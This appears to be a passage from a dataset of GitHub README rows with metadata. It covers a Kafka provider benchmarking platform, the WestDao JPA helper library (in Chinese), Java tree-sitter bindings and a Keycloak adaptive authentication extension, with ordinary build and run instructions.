- Total Cost: The total cost of the Kafka Provider, in USD. The value is equal to the baseline cost plus the usage cost.

## How to Contribute

Assuming your Kafka provider is named `foo`, you will create the following content to include `foo` in the comparison list:
Create a `driver-foo` module in the root directory, and the `/deploy/aws-cn` directory of this module must include the following key files:
- var.tfvars: By default, to ensure the fixed workload and production/consumption mode, we only open the following values for customization. If these configurations are not suitable for your Kafka Provider, you can submit a new PR and explain which new values need to be opened and the reasons.
- deploy.yaml: The Ansible playbook configuration file for deploying the specific Kafka Provider.
- cost_explanation.md: A document explaining how the cost is calculated. Different Kafka Providers have different implementations, leading to significant differences in the usage of some computing and storage services. To ensure fairness and openness, please provide a detailed explanation of the cost usage calculation logic. This part of the explanation can refer to the files in the `cost-explanation` directory of the project.
- infracost usage config yaml: In the root directory of infracost, we provide a default `template-medium-500m` template file, which is also the default usage configuration file for infracost medium scale. You can modify this file according to the actual situation of your Kafka Provider to more accurately calculate the usage cost. And publicly explain these modifications in `cost-explanation/foo.md`.

After completing the above steps, you need to add a new job in the three files under `.github/workflows` following the pattern of other Kafka Providers to ensure that the Workflow can execute the Benchmark process of your Kafka Provider when it runs on a schedule. If you have any questions about how to contribute, feel free to submit an issue under this project or join our [Slack](https://join.slack.com/t/automq/shared_invite/zt-29h17vye9-thf31ebIVL9oXuRdACnOIA) channel for discussion.

You can fork our code and test it locally. When you are satisfied with the test, you can submit a PR to our repository. We will review and merge your PR after receiving it. After merging, we will check the accuracy of your code execution in our workflow. If there are any issues, we will provide feedback on the PR and temporarily disable the execution and comparison of your Kafka Provider in the workflow (for new Kafka providers) or revert to the previous version.

> Tips: Currently, only comparisons in the cn-northwest-1 region of AWS China are supported. More cloud providers and regions will be supported in the future. The test allows users to use different numbers and specifications of machines. Using higher machine specifications will improve performance but also increase costs.

### How to Contribute a Non-Open-Source Kafka Provider

KPC also supports comparisons of non-open-source Kafka Providers. If your Kafka Provider is not open-source, you can provide a basic image that is encrypted or obfuscated to contribute a new Kafka Provider for deployment and testing in our environment. For Kafka Providers that are not open-source and do not provide images, such as Confluent/Aiven, we will use the Terraform provider they provide for deployment.

### Fixed Workload Configuration

To ensure the fairness of the comparison, we have fixed a representative Workload, Producer, and Consumer configuration [tail-read-100m.yaml](workloads/vs/fast-tail-read-100m.yaml). This configuration supports generating a theoretical peak write throughput of 100 MB/s.

### Cost Estimation

#### Challenges and Solutions of Cost Estimation

The cost of fixed-scale cloud services can be clearly calculated. The challenge of cost estimation lies in the estimation of cloud service usage. Cloud services measure and charge for different services based on usage, such as API calls and storage space for S3. Different products have different implementations, making usage cost estimation very challenging. To ensure accurate and fair estimation, we will provide a markdown file named after the Kafka provider in the driver directory of each Kafka Provider to explain how the cost is calculated. Different Kafka Providers have different implementations, leading to significant differences in the usage of some computing and storage services. To ensure fairness and openness, we will ensure that all Kafka providers provide detailed cost calculation logic for computing and storage costs. The following are the cost estimation explanations for different Kafka Providers:

- [AutoMQ](cost-explanation/automq.md)
- [Apache Kafka](cost-explanation/kafka.md)
- [Apache MSK](cost-explanation/msk.md)

### Dependent Action Secrets

- AUTOMQ_ACCESS_KEY: AWS Access Key
- AUTOMQ_SECRET_KEY: AWS Secret Key
- INFRA_COST_API_KEY: Infracost API Key. Can be obtained from [Infracost](https://www.infracost.io/)
- SSH_PRIVATE_KEY: SSH Private Key, directly fixed in secrets
- SSH_PUBLIC_KEY: SSH Public Key, directly fixed in secrets
- TF_BACKEND_BUCKET: S3 Bucket for storing Terraform State
- TF_BACKEND_KEY: S3 Key for storing Terraform State

## Comparison Report Generation Cycle

We plan to trigger the workflow to generate a comparison report every Monday at 8 AM.

## Roadmap

- Add horizontal automated comparisons for Kafka Providers such as Confluent/Aiven/Redpanda/WarpStream/Pulsar
- Support comparison of elasticity, i.e., how long it takes for the Client to recover from scaling actions
- Add tests related to Kafka compatibility.
- More visually appealing and readable comparative reports.

## License

Licensed under the Apache License, Version 2.0: http://www.apache.org/licenses/LICENSE-2.0

The original works is from the [OpenMessaging Benchmark Framework](https://github.com/openmessaging/benchmark/).
",0,1,2,apache-2.0,1.0,"['english', 'kafka', 'provider', 'comparison', 'kafka', 'provider', 'comparison', 'kpc', 'public', 'kafka', 'comparison', 'platform', 'built', 'code', 'openmessaging', 'benchmark', 'kafka', 'api', 'become', 'de', 'facto', 'standard', 'streaming', 'domain', 'recent', 'year', 'many', 'new', 'streaming', 'system', 'compatible', 'kafka', 'api', 'hereinafter', 'referred', 'kafka', 'provider', 'emerged', 'purpose', 'building', 'comparison', 'platform', 'determine', 'best', 'kafka', 'streaming', 'system', 'provide', 'fair', 'objective', 'open', 'comparison', 'environment', 'generate', 'objective', 'fair', 'kafka', 'streaming', 'system', 'comparison', 'report', 'comparison', 'report', 'include', 'multiple', 'comparison', 'dimension', 'latency', 'cost', 'elasticity', 'throughput', 'different', 'product', 'different', 'design', 'architecture', 'naturally', 'perform', 'differently', 'various', 'comparison', 'dimension', 'objective', 'comparison', 'result', 'helpful', 'user', 'making', 'technical', 'selection', 'supported', 'kafka', 'provider', 'automq', 'apache', 'kafka', 'amazon', 'msk', 'comparison', 'platform', 'execution', 'logic', 'execution', 'logic', 'comparison', 'platform', 'encapsulated', 'github', 'action', 'comparison', 'task', 'triggered', 'github', 'action', 'workflow', 'execution', 'logic', 'comparison', 'task', 'follows', 'github', 'action', 'meet', 'scheduled', 'trigger', 'condition', 'trigger', 'workflow', 'execution', 'benchmark', 'process', 'multiple', 'kafka', 'provider', 'included', 'workflow', 'executed', 'parallel', 'benchmark', 'provider', 'process', 'includes', 'following', 'sequential', 'executed', 'order', 'different', 'kafka', 'provider', 'evaluated', 'simultaneously', 'install', 'initialize', 'cloud', 'resource', 'aws', 'according', 'terraform', 'configuration', 'file', 'check', 'code', 'install', 'dependency', 'use', 'ansible', 'playbook', 'install', 'kafka', 'provider', 'stage', 'also', 'calculate', 'cost', 'based', 'terraform', 'configuration', 'file', 'part', 'final', 'comparison', 'report', 'benchmark', 'stage', 'depends', 'install', 'stage', 'triggered', 'completion', 'stage', 'mainly', 'us', 'information', 'terraform', 'output', 'remotely', 'log', 'cloud', 'client', 'machine', 'execute', 'openmessaging', 'benchmark', 'test', 'generate', 'report', 'benchmark', 'result', 'file', 'executed', 'cloud', 'client', 'copied', 'github', 'runner', 'machine', 'content', 'parsed', 'generate', 'final', 'report', 'content', 'displayed', 'uninstall', 'stage', 'depends', 'benchmark', 'stage', 'triggered', 'completion', 'stage', 'clean', 'cloud', 'resource', 'including', 'deleting', 'cloud', 'client', 'machine', 'kafka', 'provider', 'cluster', 'cloud', 'benchmark', 'report', 'description', 'complete', 'benchmark', 'report', 'include', 'following', 'content', 'report', 'generated', 'generation', 'time', 'report', 'based', 'generation', 'time', 'see', 'specific', 'workflow', 'execution', 'detail', 'github', 'action', 'repository', 'including', 'cost', 'calculated', 'benchmark', 'output', 'log', 'etc', 'workload', 'configuration', 'workload', 'configuration', 'information', 'extracted', 'openmessaging', 'benchmark', 'run', 'log', 'ensure', 'fairness', 'comparison', 'use', 'exact', 'workload', 'producer', 'consumer', 'configuration', 'kafka', 'provider', 'producer', 'configuration', 'producer', 'configuration', 'producer', 'configuration', 'kafka', 'provider', 'consumer', 'configuration', 'consumer', 'configuration', 'consumer', 'configuration', 'kafka', 'provider', 'topic', 'configuration', 'topic', 'configuration', 'topic', 'configuration', 'kafka', 'provider', 'replication', 'factor', 'replication', 'factor', 'replication', 'factor', 'kafka', 'provider', 'average', 'throughput', 'average', 'throughput', 'entire', 'benchmark', 'process', 'pub', 'latency', 'm', 'avg', 'average', 'publish', 'latency', 'entire', 'benchmark', 'process', 'ms', 'pub', 'latency', 'm', 'publish', 'latency', 'entire', 'benchmark', 'process', 'ms', 'latencyavg', 'm', 'average', 'latency', 'entire', 'benchmark', 'process', 'ms', 'latency', 'm', 'latency', 'entire', 'benchmark', 'process', 'ms', 'latency', 'm', 'latency', 'entire', 'benchmark', 'process', 'ms', 'baseline', 'cost', 'baseline', 'cost', 'kafka', 'provider', 'excluding', 'usage', 'cost', 'iaa', 'cloud', 'service', 'usd', 'based', 'infracost', 'cost', 'calculated', 'analyzing', 'terraform', 'configuration', 'file', 'usage', 'cost', 'cloud', 'resource', 'usage', 'cost', 'kafka', 'provider', 'usd', 'based', 'infracost', 'cost', 'calculated', 'analyzing', 'terraform', 'configuration', 'file', 'usage', 'configuration', 'usage', 'calculated', 'based', 'infracost', 'usage', 'directory', 'example', 'automq', 'calculate', 'cost', 'based', 'average', 'write', 'throughput', 'put', 'get', 'per', 'gb', 'write', 'throughput', 'cost', 'estimation', 'logic', 'explained', 'detail', 'following', 'chapter', 'total', 'cost', 'total', 'cost', 'kafka', 'provider', 'usd', 'value', 'equal', 'baseline', 'cost', 'plus', 'usage', 'cost', 'contribute', 'assuming', 'kafka', 'provider', 'named', 'create', 'following', 'content', 'include', 'comparison', 'list', 'create', 'module', 'root', 'directory', 'directory', 'module', 'must', 'include', 'following', 'key', 'file', 'default', 'ensure', 'fixed', 'workload', 'mode', 'open', 'following', 'value', 'customization', 'configuration', 'suitable', 'kafka', 'provider', 'submit', 'new', 'pr', 'explain', 'new', 'value', 'need', 'opened', 'reason', 'ansible', 'playbook', 'configuration', 'file', 'deploying', 'specific', 'kafka', 'provider', 'document', 'explaining', 'cost', 'calculated', 'different', 'kafka', 'provider', 'different', 'implementation', 'leading', 'significant', 'difference', 'usage', 'computing', 'storage', 'service', 'ensure', 'fairness', 'openness', 'please', 'provide', 'detailed', 'explanation', 'cost', 'usage', 'calculation', 'logic', 'part', 'explanation', 'refer', 'file', 'directory', 'project', 'infracost', 'usage', 'config', 'yaml', 'root', 'directory', 'infracost', 'provide', 'default', 'template', 'file', 'also', 'default', 'usage', 'configuration', 'file', 'infracost', 'medium', 'scale', 'modify', 'file', 'according', 'actual', 'situation', 'kafka', 'provider', 'accurately', 'calculate', 'usage', 'cost', 'publicly', 'explain', 'modification', 'completing', 'step', 'need', 'add', 'new', 'job', 'three', 'file', 'following', 'pattern', 'kafka', 'provider', 'ensure', 'workflow', 'execute', 'benchmark', 'process', 'kafka', 'provider', 'run', 'schedule', 'question', 'contribute', 'feel', 'free', 'submit', 'issue', 'project', 'join', 'slack', 'channel', 'discussion', 'fork', 'code', 'test', 'locally', 'satisfied', 'test', 'submit', 'pr', 'repository', 'review', 'merge', 'pr', 'receiving', 'merging', 'check', 'accuracy', 'code', 'execution', 'workflow', 'issue', 'provide', 'feedback', 'pr', 'temporarily', 'disable', 'execution', 'comparison', 'kafka', 'provider', 'workflow', 'new', 'kafka', 'provider', 'revert', 'previous', 'version', 'tip', 'currently', 'comparison', 'region', 'aws', 'china', 'supported', 'cloud', 'provider', 'region', 'supported', 'future', 'test', 'allows', 'user', 'use', 'different', 'number', 'specification', 'machine', 'using', 'higher', 'machine', 'specification', 'improve', 'performance', 'also', 'increase', 'cost', 'contribute', 'kafka', 'provider', 'kpc', 'also', 'support', 'comparison', 'kafka', 'provider', 'kafka', 'provider', 'provide', 'basic', 'image', 'encrypted', 'obfuscated', 'contribute', 'new', 'kafka', 'provider', 'deployment', 'testing', 'environment', 'kafka', 'provider', 'provide', 'image', 'use', 'terraform', 'provider', 'provide', 'deployment', 'fixed', 'workload', 'configuration', 'ensure', 'fairness', 'comparison', 'fixed', 'representative', 'workload', 'producer', 'consumer', 'configuration', 'configuration', 'support', 'generating', 'theoretical', 'peak', 'write', 'throughput', 'cost', 'estimation', 'challenge', 'solution', 'cost', 'estimation', 'cost', 'cloud', 'service', 'clearly', 'calculated', 'challenge', 'cost', 'estimation', 'lie', 'estimation', 'cloud', 'service', 'usage', 'cloud', 'service', 'measure', 'charge', 'different', 'service', 'based', 'usage', 'api', 'call', 'storage', 'space', 'different', 'product', 'different', 'implementation', 'making', 'usage', 'cost', 'estimation', 'challenging', 'ensure', 'accurate', 'fair', 'estimation', 'provide', 'markdown', 'file', 'named', 'kafka', 'provider', 'driver', 'directory', 'kafka', 'provider', 'explain', 'cost', 'calculated', 'different', 'kafka', 'provider', 'different', 'implementation', 'leading', 'significant', 'difference', 'usage', 'computing', 'storage', 'service', 'ensure', 'fairness', 'openness', 'ensure', 'kafka', 'provider', 'provide', 'detailed', 'cost', 'calculation', 'logic', 'computing', 'storage', 'cost', 'following', 'cost', 'estimation', 'explanation', 'different', 'kafka', 'provider', 'automq', 'apache', 'kafka', 'apache', 'msk', 'dependent', 'action', 'secret', 'aws', 'access', 'key', 'aws', 'secret', 'key', 'infracost', 'api', 'key', 'obtained', 'infracost', 'ssh', 'private', 'key', 'directly', 'fixed', 'secret', 'ssh', 'public', 'key', 'directly', 'fixed', 'secret', 'bucket', 'storing', 'terraform', 'state', 'key', 'storing', 'terraform', 'state', 'comparison', 'report', 'generation', 'cycle', 'plan', 'trigger', 'workflow', 'generate', 'comparison', 'report', 'every', 'monday', 'roadmap', 'add', 'horizontal', 'automated', 'comparison', 'kafka', 'provider', 'support', 'comparison', 'elasticity', 'long', 'take', 'client', 'recover', 'scaling', 'action', 'add', 'test', 'related', 'kafka', 'compatibility', 'visually', 'appealing', 'readable', 'comparative', 'report', 'license', 'licensed', 'apache', 'license', 'version', 'http', 'original', 'work', 'openmessaging', 'benchmark', 'framework']","['kafka', 'provider', 'cost', 'comparison', 'configuration']",1,0,0,"['kafka', 'provider', 'comparison', 'support', 'kafka', 'provider', 'comparison', 'platform', 'execution', 'logic', 'benchmark', 'report', 'description', 'how', 'contribute', 'how', 'contribute', 'kafka', 'provider', 'fix', 'workload', 'configuration', 'cost', 'estimation', 'challenge', 'solution', 'cost', 'estimation', 'dependent', 'action', 'secret', 'comparison', 'report', 'generation', 'cycle', 'roadmap', 'license']",13,"['kafka', 'provider', 'comparison', 'report', 'how']",0,38.0,21.0,"[com.diffplug.spotless:spotless-maven-plugin,com.github.spotbugs:spotbugs-maven-plugin,com.mycila:license-maven-plugin,com.spotify:dockerfile-maven-plugin,maven-assembly-plugin,maven-failsafe-plugin,maven-surefire-plugin,org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.jacoco:jacoco-maven-plugin]",0.0,18.0,3.0,11294,20.79268292682927,5.336070381231671,"['OpenMessaging Benchmark -> https://github.com/openmessaging/benchmark', 'AutoMQ -> https://www.automq.com', 'Apache Kafka -> https://kafka.apache.org', 'Amazon MSK -> https://docs.amazonaws.cn/msk/index.html', 'issue-1 -> https://github.com/AutoMQ/kafka-provider-comparison/issues/1', 'Infracost -> https://www.infracost.io/', 'Infracost -> https://www.infracost.io/', 'Slack -> https://join.slack.com/t/automq/shared_invite/zt-29h17vye9-thf31ebIVL9oXuRdACnOIA', 'Infracost -> https://www.infracost.io/', 'OpenMessaging Benchmark Framework -> https://github.com/openmessaging/benchmark/']",10
westwong/westDao,master,"# Wise Exectution  Simple Tools

## [WestDao](https://github.com/westwong/westDao)

[English](https://github.com/westwong/westDao/blob/master/README-en.md)

欢迎来到 WestDao！这个项目旨在 用更少的代码完成日常开发工作，直接给出DEMO

```java
@RestController
public class WestUserController {
    @PostMapping(""/user/save"")
    public Result<Object> saveUser(@RequestBody WestUser user) {
        user.setAvatar(""default.png"").save();
        return Result.successResult();
    }
}
```

几行代码，便完成了用户信息保存

```java
    @PostMapping(""/user/delete"")
    public Result<Object> deleteById(WestUser user) {
        Assert.notNull(user.getId(), ""id is required"");
        boolean success = user.deleteById();
        return Result.successResult(success);
    }
    @RequestMapping(""/user/find"")
    public Result<Object> findById(WestUser user) {
        Assert.notNull(user.getId(), ""id is required"");
        User User = user.findById();
        return Result.successResult(User);
    }
	@RequestMapping(""/v3/user/find"")
	public Result<Object> findByIdV3(User user) {
    	Assert.notNull(user.getId(), ""id is required"");
    	User db = new WestUser(user).findById();
    	return Result.successResult(db);
	}	
    @PostMapping(""/user/update"")
    public Result<Object> updateById(WestUser user) {
        Assert.notNull(user.getId(), ""id is required"");
        user.updateById();
        return Result.successResult();
    }
```

同理，删、查、改也不会掉链子

### 介绍

[westDao](https://github.com/westwong/westDao/tree/master/WestDaoCore)是基于[Spring Data JPA](https://spring.io/projects/spring-data-jpa)完成的持久层框架，并且借鉴了[MyBatis-plus](https://baomidou.com/) 的代码风格，能够动态的生成[JPQL](https://docs.oracle.com/cd/E29542_01/apirefs.1111/e13946/ejb3_langref.html)，

完整的保留JPA的原生属性，你在享受JPA无表管理的方便之余，也能感受到如MyBatis-plus般的链式代码，强大JPQL让你对平台兼容性再无后顾之忧

```java
 private static LambdaQuery<User> getJPQL(TestDto dto) {
        return West.<User>queryJPQL()
                .eq(dto.isEq(), User::getId, 20L)
            	// 对于or调用专门说一下，因为JPA原始框架的原因 JPQL or()的括号会被省去，调试时注意
                .or(dto.isOr(), (q -> q.eq(User::getId, 18L).eq(User::getName, dto.getName())
                ))
                .and(dto.isAnd(), (q -> q.eq(User::getId, 18L).or(q1 -> q1.eq(User::getName, dto.getName()))
                ))
                .ne(dto.isNe(), User::getAge, 79)
                .le(dto.isLe(), User::getAge, 20)
                .ge(dto.isGe(), User::getAge, 80)
                .between(dto.isBetween(), User::getAge, 20, 80)
                .notBetween(dto.isNotBetween(), User::getAge, 20, 80)
                .like(dto.isLike(), User::getName, ""ru"")
                .likeLeft(dto.isLikeLeft(), User::getName, ""ac"")
                .likeRight(dto.isLikeRight(), User::getName, ""da"")
                .in(dto.isIn(), User::getAge, Arrays.asList(20, 21, 22))
                .notIn(dto.isNotIn(), User::getAge, Arrays.asList(20, 21, 22))
                .isNull(dto.isWasNull(), User::getName)
                .isNotNull(dto.isWasNotNull(), User::getName)
                .inJPQL(dto.isInJpql(), User::getName, ""select nickName from UserInfo where id = 1"");
    }
```

```
@RequestMapping(""/v1/user/update"")
public Result<Object> updateToPrams(WestUser user) {
    int num = user.update(
            West.updateJPQL(User.class).update(new User().setAge(10)).eq(User::getId, 20L)
    );
    return Result.successResult(num);
}
```

总之一个思想，对象自己处理自己，自己给自己提供一切持久层方法，你不用关心如何调用（**Wise Exection**）

只管写（**Simple Tools**)

当然我同样也对链式调用赋于DAO能力

```java
@RequestMapping(""/v2/user/update"")
@Transactional
public Result<Object> updateToPramsV2(User user) {
    int execute = West.updateJPQL(user).eq(User::getId, 20L).execute();
    return Result.successResult(execute);
}
@RequestMapping(""/v2/user/findAll"")
public Result<Object> findALLV2(TestDto dto) {
    Map<String, Object> count = getJPQL(dto).select(""count(1) as total"").getMap();
    Map<String, Object> sum = getJPQL(dto).select(""sum(age) as total"").getMap();
    Map<String, Object> map = getJPQL(dto).getMap();
    List<Map<String, Object>> maps = getJPQL(dto).listMap();

    User entity = getJPQL(dto).getEntity();
    List<User> users = getJPQL(dto).listEntity();
    Map<String, Object> result = new HashMap<>(4);
    result.put(""count"", count);
    result.put(""sum"", sum);
    result.put(""map"", map);
    result.put(""maps"", maps);
    result.put(""entity"", entity);
    result.put(""users"", users);
    return Result.successResult(result);
}

@RequestMapping(""/v2/user/page"")
public Result<Object> pageV2(TestDto dto) {
    Page<User> pageUser = getJPQL(dto).pageEntity(PageRequest.of(dto.getPageNum(), dto.getPageSize()));
    Page<Map<String, Object>> pageMap = getJPQL(dto).pageMap(PageRequest.of(dto.getPageNum(), dto.getPageSize()));
    Map<String, Object> result = new HashMap<>(4);
    result.put(""map"", pageMap);
    result.put(""users"", pageUser);
    return Result.successResult(result);
}

@RequestMapping(""/v2/user/deleteAll"")
@Transactional
public Result<Object> deleteAllV2(User user) {
    int execute = West.deleteJPQL(user).execute();
    int execute1 = West.<User>deleteJPQL().execute();
    return Result.successResult(execute);
}

// 对group limit orderBY的支持
@RequestMapping(""/v2/user/list"")
public Result<Object> listV2() {
    List<User> orderBY = West.<User>queryJPQL()
            .orderByDesc(User::getAge)
            .orderByAsc(User::getId)
            .limit(10)
            .listEntity();
    List<Map<String, Object>> group = West.<User>queryJPQL()
         // age 不给别名就会默认为 'colnum0'
            .select(""age as age, count(1) as num"")
            .groupBy(User::getAge)
            .having(""age > 10"")
            .orderByAsc(User::getAge)
            .listMap();
    Map<String, Object> result = new HashMap<>(4);
    result.put(""orderBY"", orderBY);
    result.put(""group"", group);
    return Result.successResult(result);
}
```

我相信项目做得多的朋友，看到这里已经能知道优势了，什么service，什么dao，什么Respositroy ？我们通通暂时不管，一个Controller 能解决的事情，不要搞的那么麻烦。简单的数据有简单的处理办法，对于一些复杂多表逻辑你才有创建service的必要，毕竟省出来的时间是你的

### 开始

赋予实体对象以上能力，其实也很简单，你只需在标注@Entity的实体类上，再增加一个@WestDao

这里建议增加@Accessors(chain = true)，子类也将赋予链式调用能力

```java
@Entity
@Data
@Accessors(chain = true)
@WestDao(prefix = ""west"")
public class User {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    @Column(length = 32)
    private String name;
    @Column(columnDefinition = ""text"")
    private String avatar;
    private Integer age;
    @Column
    @DateTimeFormat(pattern = ""yyyy-MM-dd HH:mm:ss"")
    private LocalDateTime createTime;
    @PrePersist
    public void prePersistCreateTime() {
        if (createTime == null) {
            createTime = LocalDateTime.now();
        }
    }
}
```

是的，就只需要一个＠ＷestDao(prefix = ""west"")，当然""west""也可以是你喜欢的任何字符串，比如 love、me、you、like

哦，对了，你如果是看到这里，无所谓的，但是如果你跟着做，你要骂人了，因为你还没有引入依赖
根据版本引入<westdao.version>latest</westdao.version> 详情请看 releases

在<annotationProcessorPaths> 中把westdao-core 写在lombok 后面，保证执行顺序

```xml

<dependency>
    <groupId>cn.k2future</groupId>
    <artifactId>westdao-core</artifactId>
    <version>${westdao.version}</version>
</dependency>
<plugin>
<groupId>org.apache.maven.plugins</groupId>
<artifactId>maven-compiler-plugin</artifactId>
<version>3.8.1</version>
<configuration>
    <source>1.8</source>
    <target>1.8</target>
   
         <path>
              <groupId>org.projectlombok</groupId>
              <artifactId>lombok</artifactId>
              <version>1.18.24</version>
         </path>
         <path>
            <groupId>cn.k2future</groupId>
            <artifactId>westdao-core</artifactId>
            <version>${westdao.version}</version>
        </path>
    </annotationProcessorPaths>
</configuration>
</plugin>
```

我们还需要先编译一下，编译就是用 mvn compile

这样@Entity的 target 的同级目录下，就会生成以 prefix + entity 名字class 文件，接参是它，保存是它，修改是他，删除也是它，用好它吧

```java
public class WestUser extends User implements WestDao<User>
public class LikeUser extends User implements WestDao<User>
public class MyUser extends User implements WestDao<User>
```

当前支持版本:  spring boot 2.X 、jdk 1.8
严谨起见，我测试通过的是：2.3.12.RELEASE 

如果你是新手？完整的 [pom ](https://github.com/westwong/westDao/blob/master/WestDaoTest/pom.xml)文件你先看看？
还是不懂？那再看看  [testDemo](https://github.com/westwong/westDao/tree/master/WestDaoTest) 
还有疑问？给我发邮件吧 deadshoot@foxmail.com 

最后欢迎各位大佬 提交  [Issue](https://github.com/westwong/westDao/issues) 和 [Pull request](https://github.com/westwong/westDao/pulls)

你有什么好的想法想跟我交流的微信：deadshoot

最后再强调一下我们的目标：**Wise Execution , Simple Tools**",5,0,1,apache-2.0,0.0,"['wise', 'exectution', 'simple', 'tool', 'westdao', 'english', 'westdao', 'spring', 'data', 'jpa', 'jpql', 'wise', 'exection', 'simple', 'tool', 'westdao', 'accessors', 'chain', 'true', 'prefix', 'west', 'west', 'latest', 'release', 'mvn', 'compile', 'target', 'prefix', 'entity', 'spring', 'boot', 'pom', 'testdemo', 'deadshoot', 'issue', 'pull', 'request', 'wise', 'execution', 'simple', 'tool']","['wise', 'simple', 'tool', 'westdao', 'spring']",0,0,0,"['wise', 'exectution', 'simple', 'tool', 'westdao', 'http']",4,"['wise', 'exectution', 'simple', 'tool', 'westdao']",8,0.0,3.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,2.0,1.0,8460,964.0,5.784232365145228,"['WestDao -> https://github.com/westwong/westDao', 'English -> https://github.com/westwong/westDao/blob/master/README-en.md', 'westDao -> https://github.com/westwong/westDao/tree/master/WestDaoCore', 'Spring Data JPA -> https://spring.io/projects/spring-data-jpa', 'MyBatis-plus -> https://baomidou.com/', 'JPQL -> https://docs.oracle.com/cd/E29542_01/apirefs.1111/e13946/ejb3_langref.html', 'pom  -> https://github.com/westwong/westDao/blob/master/WestDaoTest/pom.xml', 'testDemo -> https://github.com/westwong/westDao/tree/master/WestDaoTest', 'Issue -> https://github.com/westwong/westDao/issues', 'Pull request -> https://github.com/westwong/westDao/pulls']",10
tree-sitter/java-tree-sitter,master,"# Java Tree-sitter

[![CI][ci]](https://github.com/tree-sitter/java-tree-sitter/actions/workflows/ci.yml)
[![central][central]](https://central.sonatype.com/artifact/io.github.tree-sitter/jtreesitter)
[![docs][docs]](https://tree-sitter.github.io/java-tree-sitter/)

Java bindings to the [tree-sitter] parsing library.

## Building

- Install JDK 22 and set `JAVA_HOME` to it
- Download [jextract] and add it to your `PATH`

```bash
git clone https://github.com/tree-sitter/java-tree-sitter
cd java-tree-sitter
git submodule init
mvn test
```

## Alternatives

These alternatives support older JDK versions or Android:

- [tree-sitter/kotlin-tree-sitter](https://github.com/tree-sitter/kotlin-tree-sitter) (JDK 17+, Android SDK 23+, Kotlin 1.9)
- [bonede/tree-sitter-ng](https://github.com/bonede/tree-sitter-ng) (JDK 8+)
- [seart-group/java-tree-sitter](https://github.com/seart-group/java-tree-sitter) (JDK 11+)
- [AndroidIDEOfficial/android-tree-sitter](https://github.com/AndroidIDEOfficial/android-tree-sitter) (Android SDK 21+)

[tree-sitter]: https://tree-sitter.github.io/tree-sitter/
[ci]: https://img.shields.io/github/actions/workflow/status/tree-sitter/java-tree-sitter/ci.yml?logo=github&label=CI
[central]: https://img.shields.io/maven-central/v/io.github.tree-sitter/jtreesitter?logo=sonatype&label=Maven%20Central
[docs]: https://img.shields.io/github/deployments/tree-sitter/java-tree-sitter/github-pages?logo=githubpages&label=API%20Docs
[FFM]: https://docs.oracle.com/en/java/javase/22/core/foreign-function-and-memory-api.html
[jextract]: https://jdk.java.net/jextract/
",4,1,3,mit,7.0,"['java', 'java', 'binding', 'parsing', 'library', 'building', 'install', 'jdk', 'set', 'download', 'jextract', 'add', 'alternative', 'alternative', 'support', 'older', 'jdk', 'version', 'android', 'jdk', 'android', 'sdk', 'kotlin', 'jdk', 'jdk', 'android', 'sdk']","['jdk', 'android', 'java', 'alternative', 'sdk']",0,0,0,"['java', 'building', 'alternative']",3,"['java', 'building', 'alternative']",1,133.0,1.0,"[com.diffplug.spotless:spotless-maven-plugin,com.github.spotbugs:spotbugs-maven-plugin,maven-antrun-plugin,maven-gpg-plugin,maven-javadoc-plugin,maven-source-plugin,maven-surefire-plugin,org.codehaus.mojo:build-helper-maven-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0,1590,48.8,4.930327868852459,"['![CI][ci] -> https://github.com/tree-sitter/java-tree-sitter/actions/workflows/ci.yml', '![central][central] -> https://central.sonatype.com/artifact/io.github.tree-sitter/jtreesitter', '![docs][docs] -> https://tree-sitter.github.io/java-tree-sitter/', 'tree-sitter/kotlin-tree-sitter -> https://github.com/tree-sitter/kotlin-tree-sitter', 'bonede/tree-sitter-ng -> https://github.com/bonede/tree-sitter-ng', 'seart-group/java-tree-sitter -> https://github.com/seart-group/java-tree-sitter', 'AndroidIDEOfficial/android-tree-sitter -> https://github.com/AndroidIDEOfficial/android-tree-sitter', 'jextract', 'ci', 'central', 'docs', 'FFM', 'jextract']",13
mabartos/keycloak-adaptive-authn,main,"![Keycloak](docs/img/keycloak-adaptive-colored.png)

# Keycloak Adaptive Authentication Extension

### Supported AI NLP Engines:

- **OpenAI ChatGPT** - (preview)
- **IBM Granite** - (experimental)

For more information, refer to the [README](adaptive/README.md) in `adaptive` module.

## Getting started

### Container

You can use the container image by running:

    podman run -p 8080:8080 quay.io/mabartos/keycloak-adaptive-all start

This command starts Keycloak exposed on the local port 8080 (`localhost:8080`).

In order to see the functionality in action, navigate to `localhost:8080/realms/authn-policy-adaptive/account`.

ℹ️ **INFO:** If you want to use the OpenAI capabilities, set the environment variables (by setting `-e OPEN_AI_API_*`) for the image described in the [README](adaptive/README.md#integration-with-openai) of the `adaptive` module..

ℹ️ **INFO:** If you have installed Docker, use `docker` instead of `podman`.

### Building from Source

To build from source every module, refer to particular READMEs, or follow [building and working with the code base](docs/building-source.md) guide.

## Resources with more info

1. **Adaptive Authentication**
    - [KeyConf24](https://keyconf.dev/) @ Vienna, Austria
    - [Slides](https://drive.google.com/file/d/1PESlDBR8P9nQJyPz_H45R3ZS4LjtSV_W/view?usp=sharing)
    - [Talk](https://www.youtube.com/watch?v=0zWlc08CPuo)
    - [Demo](https://drive.google.com/file/d/1dv5zWM69-KZyT3OUjLe-3b1GcI8ErDJ2/view?usp=sharing)
2. **AI-powered Keycloak**
    - OpenShiftAI Roadshow @ Bratislava, Slovakia
    - [Slides](https://drive.google.com/file/d/1WscEQlWpjYdrOwGDMj9IDV6bARY-4Utn/view?usp=sharing)
3. **Adaptive Authentication**
    - Master's thesis completed 2024
    - (Information might differ)
    - [Document](https://github.com/mabartos/adaptive-authn-docs/blob/main/Adaptive_Authentication_Final.pdf)
